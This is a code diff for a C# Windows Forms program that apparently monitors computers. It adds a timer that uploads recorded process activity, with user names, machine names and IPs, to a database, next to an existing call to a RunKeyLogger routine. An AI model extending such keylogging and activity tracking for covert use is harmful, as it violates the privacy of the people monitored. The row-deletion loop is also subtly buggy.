@@ -50,13 +50,14 @@ namespace CrcMrc
         ListViewItem IdleProcessItem;
         dsProcess.ProcessDataTable pdt;
         common comm;
-        
+        DBConnect dbConnect;
 
 
         public Form2api()
         {
             InitializeComponent();
             comm = new common();
+            dbConnect = new DBConnect();
             InitVal();
         }        
 
@@ -302,6 +303,26 @@ namespace CrcMrc
         private void KeyTime_Tick(object sender, EventArgs e)
         {
             RunKeyLogger();
+        }
+
+        private void TimerDB_Tick(object sender, EventArgs e)
+        {
+
+            //dbConnect.InsertProcess("CRC_Test", 505, DateTime.Now, "kreso", "kresimir", "192.168.1.101");
+            
+            for (int i = 0; i < pdt.Rows.Count; i++)
+            {
+                dsProcess.ProcessRow row;
+                row = (dsProcess.ProcessRow) pdt.Rows[i];
+                if (dbConnect.CheckProcess(row.ProcesName,row.ProcID,row.ProcTime,row.CompName,row.CompUser,row.IP) == false)
+                {
+                    dbConnect.InsertProcess(row.ProcesName, row.ProcID, row.ProcTime, row.CompName, row.CompUser, row.IP);
+                    pdt.Rows[i].Delete();
+                    pdt.AcceptChanges();
+                }
+
+            }
+            
         }
     }
 }
